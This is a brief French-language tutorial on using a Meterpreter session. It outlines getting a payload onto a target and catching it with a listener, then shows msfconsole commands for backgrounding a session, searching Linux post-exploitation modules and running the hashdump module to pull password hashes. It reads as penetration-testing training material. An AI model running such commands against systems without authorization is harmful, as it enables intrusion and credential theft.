# Les bases d'une session meterpreter

Pour arriver à avoir une session meterpreter, il faut d'abord avoir un accès à la machine cible. Pour cela, il faut exploiter une faille de sécurité, ou utiliser un mot de passe trouvé par bruteforce ou par social engineering. 
Ensuite, il faut générer une payload avec msfvenom, et l'envoyer sur la machine cible.
Enfin, il faut lancer un listener sur la machine attaquante, et attendre que la victime se connecte.

## Les commandes de base

Une fois que la victime s'est connectée, on peut utiliser les commandes de base de meterpreter.

Le mieux est de passer la session meterpreter en arrière plan, pour pouvoir utiliser les commandes de msfconsole en même temps.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
```

Ensuite on peut chercher les modules de post exploitation disponibles.

```bash
msf6 exploit(multi/handler) > search post/linux
```

Une fois le module trouvé, on peut retourner dans la session meterpreter, et lancer le module.

```bash
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > run post/linux/gather/hashdump
```

